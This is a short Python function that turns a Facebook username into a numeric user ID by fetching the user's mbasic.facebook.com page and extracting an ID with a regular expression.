#--- CONVERT ID
def converter(uid):
	if "me" in uid:
		return {"uid":uid}
	elif(re.findall("\w+",uid)):
		r = requests.get(f"https://mbasic.facebook.com/{uid}?_rdr").text
		try:
			user = re.findall('\;rid\=(\d+)\&',str(r))[0]
		except:
			user = uid
	return {"uid":user}

